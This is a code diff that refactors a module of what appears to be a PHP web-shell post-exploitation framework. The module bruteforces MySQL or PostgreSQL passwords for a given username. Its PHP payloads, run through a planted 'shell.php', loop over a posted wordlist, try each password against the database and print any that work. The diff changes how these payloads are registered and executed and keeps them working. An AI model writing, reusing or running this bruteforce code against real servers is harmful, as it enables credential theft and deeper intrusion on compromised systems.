@@ -1,6 +1,5 @@
 from core.moduleprobe import ModuleProbe
 from core.moduleexception import ProbeException, ProbeSucceed
-from core.vector import VectorList, Vector
 from core.savedargparse import SavedArgumentParser as ArgumentParser
 from ast import literal_eval
 from argparse import SUPPRESS
@@ -28,29 +27,26 @@ class Sql(ModuleProbe):
     """ Bruteforce SQL username"""
     
 
-    def _init_vectors(self):
-        self.support_vectors = VectorList([
-                Vector('shell.php', 'check_connect', "(is_callable('$dbms_connect') && print(1)) || print(0);"),
-                Vector('shell.php', 'mysql', [ """ini_set('mysql.connect_timeout',1);
+    def _set_vectors(self):
+        self.support_vectors.add_vector('check_connect','shell.php',  "(is_callable('$dbms_connect') && print(1)) || print(0);")
+        self.support_vectors.add_vector( 'mysql','shell.php', [ """ini_set('mysql.connect_timeout',1);
     foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
     $c=@mysql_connect("$hostname", "$username", "$pwd");
     if($c){
     print("+ $username:" . $pwd . "\n");
     break;
     }
-    }mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),
-                Vector('shell.php', 'postgres', [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
+    }mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
+        self.support_vectors.add_vector('postgres','shell.php',  [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
     $c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
     if($c){
     print("+ $username:" . $pwd . "\n");
     break;
     }
-    }pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),                                  
-                                      
-                ])
+    }pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"])
         
     
-    def _init_args(self):
+    def _set_args(self):
         self.argparser.add_argument('username', help='SQL username to bruteforce')
         self.argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
         self.argparser.add_argument('-wordfile', help='Local wordlist path')
@@ -103,7 +99,7 @@ class Sql(ModuleProbe):
         
         dbms_connect = 'mysql_connect' if self.args['dbms'] == 'mysql' else 'pg_connect'
         
-        if self.support_vectors.get('check_connect').execute(self.modhandler, { 'dbms_connect' : dbms_connect }) != '1':
+        if self.support_vectors.get('check_connect').execute({ 'dbms_connect' : dbms_connect }) != '1':
             raise ProbeException(self.name,  '\'%s\' %s' % (dbms_connect, WARN_NOT_CALLABLE))            
     
     def _probe(self):
@@ -116,7 +112,7 @@ class Sql(ModuleProbe):
             joined_chunk='\\n'.join(chunk)
             args_formats = { 'hostname' : self.args['hostname'], 'username' : self.args['username'], 'post_field' : post_field, 'data' : joined_chunk }
             self.mprint("%s: from '%s' to '%s'..." % (self.args['username'], chunk[0], chunk[-1]))
-            result = self.support_vectors.get(self.args['dbms']).execute(self.modhandler, args_formats)  
+            result = self.support_vectors.get(self.args['dbms']).execute(args_formats)  
             if result:
                 user_pwd_matched = user_pwd_re.findall(result)
                 if user_pwd_matched and len(user_pwd_matched[0]) == 2:
